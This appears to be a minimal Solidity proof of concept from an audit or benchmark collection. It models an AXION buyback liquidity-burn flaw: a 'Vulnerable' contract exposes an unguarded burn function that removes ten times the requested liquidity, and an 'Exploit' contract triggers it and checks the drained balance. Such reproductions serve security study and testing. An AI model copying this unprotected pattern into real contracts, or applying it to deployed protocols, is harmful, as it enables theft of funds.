// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 43530: AXION buyback liquidity burn. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public liquidity = 1000; uint256 public spotPrice = 1; function burn(uint256 requested) external { liquidity -= requested * 10; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.burn(10); success = bug.liquidity() == 900;
    }
}


